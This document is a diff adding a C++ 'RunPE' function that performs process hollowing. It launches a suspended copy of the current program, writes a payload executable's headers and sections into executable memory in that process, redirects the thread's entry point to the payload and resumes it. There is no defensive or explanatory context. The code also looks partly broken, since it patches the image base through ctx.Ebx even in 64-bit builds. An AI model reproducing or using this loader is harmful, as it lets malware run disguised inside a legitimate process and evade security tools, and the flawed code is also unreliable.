@@ -1,0 +1,45 @@
+void RunPE(byte_vec& payload) {
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);
+
+    PROCESS_INFORMATION pi;
+    STARTUPINFOW si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    wchar_t currentPath[MAX_PATH];
+    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
+
+    if (CreateProcessW(currentPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        CONTEXT ctx;
+        ctx.ContextFlags = CONTEXT_FULL;
+        GetThreadContext(pi.hThread, &ctx);
+
+        LPVOID imageBase = VirtualAllocEx(pi.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+        if (!imageBase) { // Failed to allocate at preferred base, try anywhere
+            imageBase = VirtualAllocEx(pi.hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        }
+
+        if (imageBase) {
+            WriteProcessMemory(pi.hProcess, imageBase, payload.data(), ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
+
+            PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
+            for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {
+                WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)imageBase + sectionHeader->VirtualAddress), (LPVOID)(payload.data() + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL);
+            }
+
+            WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &imageBase, sizeof(LPVOID), NULL);
+
+            #ifdef _WIN64
+            ctx.Rcx = (DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+            #else
+            ctx.Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+            #endif
+
+            SetThreadContext(pi.hThread, &ctx);
+            ResumeThread(pi.hThread);
+        }
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
